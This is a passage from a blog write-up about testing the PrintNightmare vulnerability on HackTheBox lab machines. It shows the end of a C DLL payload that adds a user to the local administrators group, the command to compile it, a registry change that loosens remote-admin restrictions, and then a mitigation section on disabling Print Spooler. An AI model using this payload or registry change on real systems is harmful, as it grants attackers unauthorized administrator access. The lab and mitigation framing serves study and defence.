</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;cmd.exe /c net localgroup administrators iamf /add&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>BOOL</span> <span class=n>APIENTRY</span> <span class=nf>DllMain</span> <span class=p>(</span><span class=n>HMODULE</span> <span class=n>hModule</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>ul_reason_for_call</span><span class=p>,</span> <span class=n>LPVOID</span> <span class=n>lpReserved</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span><span class=n>ul_reason_for_call</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=nl>DLL_PROCESS_ATTACH</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nf>CreateThread</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=n>LPTHREAD_START_ROUTINE</span><span class=p>)</span><span class=n>Entry</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=nl>DLL_THREAD_ATTACH</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=nl>DLL_THREAD_DETACH</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=nl>DLL_PROCESS_DETACH</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The code can be compiled from Linux using <code>mingw-w64</code> compiler (<code>sudo apt install mingw-w64</code>). I will run the following command to compile the DLL.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
</span></span></code></pre></div><p>On Bastion, although the exploit successfully evade the AV and the malicious user was added into the machine, I&rsquo;m unable to login via WinRM. However, <code>impacket-psexec</code> worked.</p><p><div class=img-container><img src=imgs/image-20210730191657750.png alt=image-20210730191657750></div></p><p>And I found out that <code>Invoke-Command</code> from localhost is allowed.</p><p><div class=img-container><img src=imgs/image-20210730192152601.png alt=image-20210730192152601></div></p><p>So, I guess the WinRM on Bastion was configured to only allow admin account for remote access. I couldn&rsquo;t get the &ldquo;right&rdquo; keywords to <em>google</em> this. Below are what I&rsquo;ve tried so far:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ winrm get winrm/config
</span></span><span class=line><span class=cl>$ winrm get winrm/config/listener
</span></span><span class=line><span class=cl>$ <span class=o>(</span>Get-PSSessionConfiguration -Name Microsoft.PowerShell<span class=o>)</span>.Permission
</span></span><span class=line><span class=cl>$ HKLM<span class=se>\S</span>OFTWARE<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\C</span>urrentVersion<span class=se>\P</span>olicies<span class=se>\S</span>ystem
</span></span><span class=line><span class=cl>$ reg add HKLM<span class=se>\S</span>OFTWARE<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\C</span>urrentVersion<span class=se>\P</span>olicies<span class=se>\S</span>ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d <span class=m>1</span> /f
</span></span></code></pre></div><h2 id=mitigation>Mitigation<a class=anchor aria-hidden=true href=#mitigation>#</a></h2><p>Microsoft provided <a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527>two options</a> as workarounds to mitigate PrintNightmare:</p><ul><li>Disable Print Spooler service</li><li>Disable inbound remote printing through Group Policy.</li></ul><p>Also, it is recommended to install <a href=https://support.microsoft.com/topic/31b91c02-05bc-4ada-a7ea-183b129578a7>KB5005010</a> patch. I have no idea to work with the second option from CLI, so I will demo the first one.</p><h4 id=disable-print-spooler-service>Disable Print Spooler Service<a class=anchor aria-hidden=true href=#disable-print-spooler-service>#</a></h4><p>Based on Microsoft guidance, I need to determine if the Print Spooler Service is running by using <code>Get-Service -Name Spooler</code> in PowerShell. If the service is running, stop and disable it by running the following commands in PowerShell consecutively.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ Stop-Service -Name Spooler -Force
</span></span><span class=line><span class=cl>$ Set-Service -Name Spooler -StartupType Disabled
</span></span></code></pre></div><p>I will run that on Bastion.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\&gt;</span> Get-Service -Name Spooler 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Status   Name               DisplayName
</span></span><span class=line><span class=cl>------   ----               -----------
</span></span><span class=line><span class=cl>Running  Spooler            Print Spooler
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\&gt;</span> Stop-Service -Name Spooler -Force
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\&gt;</span> Set-Service -Name Spooler -StartupType Disabled
</span></span></code></pre></div><p>After disabling Spooler service, I ran the exploit again, but this time, it returned a &ldquo;Connection Failed&rdquo; message.</p><p><div class=img-container><img src=imgs/image-20210717133929589.png alt=image-20210717133929589></div></p><p>The workaround is worked! But, the downside is that you loss the ability to print from both local and remote 🙃.</p><p>For more detailed mitigation, you can go to <a href=https://github.com/LaresLLC/CVE-2021-1675>this GitHub repo</a>.</p><div class=post-references><h2>References</h2><ul><li><a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527>https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527</a></li><li><a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675>https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675</a></li><li><a href=https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/>https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/</a></li><li><a href=https://github.com/cube0x0/CVE-2021-1675>https://github.com/cube0x0/CVE-2021-1675</a></li><li><a href=https://github.com/calebstewart/CVE-2021-1675>https://github.com/calebstewart/CVE-2021-1675</a></li><li><a href=https://github.com/LaresLLC/CVE-2021-1675>https://github.com/LaresLLC/CVE-2021-1675</a></li><li><a href=https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point>https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point</a></li><li><a href=https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own>https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own</a></li></ul></div></div></div><div class=post-meta-bottom><span class=date-update>Updated on April 02, 2023</span></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/hackthebox/>HackTheBox</a></li><li><a href=https://fahmifj.github.io/tags/cve-2021-1675/>CVE-2021-1675</a></li><li><a href=https://fahmifj.github.io/tags/cve-2021-34527/>CVE-2021-34527</a></li><li><a href=https://fahmifj.github.io/tags/printnightmare/>PrintNightmare</a></li><li><a href=https://fahmifj.github.io/tags/msfvenom/>msfvenom</a></li><li><a href=https://fahmifj.github.io/tags/samba/>Samba</a></li><li><a href=https://fahmifj.github.io/tags/dll/>DLL</a></li><li><a href=https://fahmifj.github.io/tags/venv/>venv</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Testing PrintNightmare on HTB Machines on twitter" href="https://twitter.com/intent/tweet/?text=Testing%20PrintNightmare%20on%20HTB%20Machines&amp;url=https%3a%2f%2ffahmifj.github.io%2farticles%2ftesting-printnightmare-on-hackthebox%2f&amp;hashtags=HackTheBox%2cCVE-2021-1675%2cCVE-2021-34527%2cPrintNightmare%2cmsfvenom%2cSamba%2cDLL%2cvenv"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Testing PrintNightmare on HTB Machines on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ffahmifj.github.io%2farticles%2ftesting-printnightmare-on-hackthebox%2f&amp;title=Testing%20PrintNightmare%20on%20HTB%20Machines&amp;summary=Testing%20PrintNightmare%20on%20HTB%20Machines&amp;source=https%3a%2f%2ffahmifj.github.io%2farticles%2ftesting-printnightmare-on-hackthebox%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Testing PrintNightmare on HTB Machines on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2farticles%2ftesting-printnightmare-on-hackthebox%2f&title=Testing%20PrintNightmare%20on%20HTB%20Machines"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Testing PrintNightmare on HTB Machines on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2farticles%2ftesting-printnightmare-on-hackthebox%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Testing PrintNightmare on HTB Machines on whatsapp" href="https://api.whatsapp.com/send?text=Testing%20PrintNightmare%20on%20HTB%20Machines%20-%20https%3a%2f%2ffahmifj.github.io%2farticles%2ftesting-printnightmare-on-hackthebox%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Testing PrintNightmare on HTB Machines on telegram" href="https://telegram.me/share/url?text=Testing%20PrintNightmare%20on%20HTB%20Machines&amp;url=https%3a%2f%2ffahmifj.github.io%2farticles%2ftesting-printnightmare-on-hackthebox%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><div class=footer-wrapper><div class=footer-right><span class=copyright>&copy; 2025&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span></div><div class=footer-mid><span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span>
&nbsp;·&nbsp;
<span class=support><a href=https://fahmifj.github.io/about#support>support</a></span>
&nbsp;·&nbsp;
<span class=rss><a href=https://fahmifj.github.io/index.xml>rss</a></span></div><div class=footer-left><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span></div></div></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>